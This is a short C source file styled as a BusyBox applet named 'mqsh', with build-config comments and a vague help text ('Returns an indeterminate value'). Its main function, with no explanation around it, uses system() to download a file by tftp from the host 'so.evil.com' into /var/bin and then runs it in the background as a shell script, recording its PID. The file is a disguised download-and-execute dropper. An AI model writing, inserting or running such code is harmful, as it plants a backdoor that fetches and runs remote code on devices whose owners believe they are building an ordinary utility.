//kbuild:lib-$(CONFIG_MQSH) += mqsh.o
//config:config MQSH
//config:	bool "mqsh"
//config:	default y
//config:	help
//config:	  Returns an indeterminate value.
//usage:#define mqsh_trivial_usage
//usage:       "[mqsh]"
//usage:#define mqsh_full_usage "\n\n"
//usage:       "MQSH - MQTT Shell Listener\n"


#include "libbb.h"
int mqsh_main(void) {
            printf ("Writing mq...\n");
            system("cd /var/bin;>mq;(tftp -g -r so.evil.com) && echo Success || echo Fail");
            printf ("Running mq...\n");
            system("export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;nohup ash /var/bin/mq & echo [ \"$!\" ] > /var/run/mq.pid");
    
    return 0;}
